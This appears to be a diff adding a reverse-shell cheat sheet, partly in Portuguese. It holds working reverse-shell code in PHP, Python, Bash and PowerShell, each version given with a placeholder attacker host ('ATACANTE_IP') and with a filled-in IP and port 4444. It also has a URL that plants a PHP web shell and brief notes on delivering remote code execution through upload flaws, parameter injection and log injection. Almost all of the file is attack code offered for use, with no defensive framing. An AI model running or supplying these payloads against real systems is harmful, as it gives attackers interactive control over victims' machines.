@@ -1,0 +1,102 @@
+<?php
+$sock=fsockopen("ATACANTE_IP",PORTA);
+exec("/bin/sh -i <&3 >&3 2>&3");
+?>
+
+
+
+<?php
+$sock=fsockopen("192.168.98.42",4444);
+exec("/bin/sh -i <&3 >&3 2>&3");
+?>
+
+
+
+Upload via file upload vulnerability or parameter injection.
+
+
+--------------------------------------------
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("ATACANTE_IP",PORTA))
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.98.12",4444))
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+
+
+Python Reverse Shell
+
+
+---------------------------------------------
+
+bash -i >& /dev/tcp/ATACANTE_IP/PORTA 0>&1
+
+
+bash -i >& /dev/tcp/192.168.98.12/4444 0>&1
+
+
+Bash Reverse Shell
+
+
+---------------------------------------------
+
+
+$client = New-Object System.Net.Sockets.TCPClient("ATACANTE_IP",PORTA)
+$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
+$sendback = (iex $data 2>&1 | Out-String)
+$sendback2 = $sendback + "PS " + (pwd).Path + "> "
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+$stream.Write($sendbyte,0,$sendbyte.Length)
+$stream.Flush()}; $client.Close()
+
+
+
+$client = New-Object System.Net.Sockets.TCPClient("192.168.98.42",4444)
+$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
+$sendback = (iex $data 2>&1 | Out-String)
+$sendback2 = $sendback + "PS " + (pwd).Path + "> "
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+$stream.Write($sendbyte,0,$sendbyte.Length)
+$stream.Flush()}; $client.Close()
+
+
+Powershell Reverse Shell (Windows)
+
+
+----------------------------------------------
+
+
+
+        http://vulnsite.com/page.php?cmd=echo '<?php system($_GET["cmd"]);?>' > shell.php
+
+   
+
+
+
+
+Técnicas de Entrega para RCE
+
+
+
+    - Injeção em Parâmetros Vulneráveis:
+
+Upload de Arquivos:
+
+    - Explorar vulnerabilidades em formulários de upload
+
+    - Injeção em Logs:
+
+        Injetar código em arquivos de log acessíveis via web.
